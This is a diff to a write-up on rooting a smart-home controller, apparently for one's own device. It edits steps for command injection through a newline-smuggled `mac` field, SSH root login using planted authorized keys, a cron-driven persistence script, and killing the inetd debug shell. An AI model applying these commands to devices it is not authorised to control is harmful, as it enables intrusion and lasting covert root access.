@@ -141,6 +141,8 @@ curl -s -X POST \
 
 `mac` is `AA\n<CMD>\n`; the injected line runs in parallel with the `macfilter commit` tail.
 
+Note: every `scene_setting` persists a scene record into `/etc/smartcontroller/SmartTask.sc` (sec_cfg partition, ~6 MB) — **always `scene_delete` it afterwards** (exploit.py does this automatically after `scene_start`). Leftovers from older runs can be wiped with `{"command":"reset_scenes"}` (removes ALL scenes on the device).
+
 ### 3. Read-back channel
 
 `/tmp/messages` ships inside the syslog tarball — copy any file there via the same channel, then download:
@@ -194,7 +196,7 @@ cp /data/authorized_keys /etc/dropbear/authorized_keys
 /usr/sbin/dropbear -s -r /data/dropbear_rsa_host_key   # -s disables password auth
 ```
 
-`ssh -i <privkey> root@<ip>` works. **Never pass `-B`** (blank-password logins). If you really want password auth, root's hash must use `$1$` md5 — this firmware's musl lacks `$6$` SHA-512 crypt.
+`ssh -i <privkey> -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@<ip>` works (stock dropbear offers ssh-rsa only — OpenSSH ≥8.8 rejects it by default, so opt back in). **Never pass `-B`** (blank-password logins). If you really want password auth, root's hash must use `$1$` md5 — this firmware's musl lacks `$6$` SHA-512 crypt.
 
 ### 7. Persistence (watchdog owns dropbear only)
 
@@ -204,7 +206,7 @@ cp /data/authorized_keys /etc/dropbear/authorized_keys
 #!/bin/sh
 mkdir -p /etc/dropbear
 cp /data/authorized_keys /etc/dropbear/authorized_keys 2>/dev/null
-pgrep -x dropbear >/dev/null 2>&1 || \
+pidof dropbear >/dev/null 2>&1 || \
     /usr/sbin/dropbear -s -r /data/dropbear_rsa_host_key
 ```
 
@@ -214,10 +216,10 @@ Append to `/etc/crontabs/root` (persistent via sec_cfg):
 * * * * * sh /data/persist.sh >/dev/null 2>&1
 ```
 
-Finishing steps — first confirm a real login (`ssh -i <privkey> root@<ip> id` returns `uid=0`); only **after that succeeds** close the debug shell (a banner alone proves nothing):
+Finishing steps — first confirm a real login (`ssh -i <privkey> -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@<ip> id` returns `uid=0`); only **after that succeeds** close the debug shell (a banner alone proves nothing):
 
 ```sh
-for p in $(pgrep -x inetd); do kill $p; done
+for p in $(pidof inetd); do kill $p; done
 rm -f /etc/inetd.conf
 ```
 
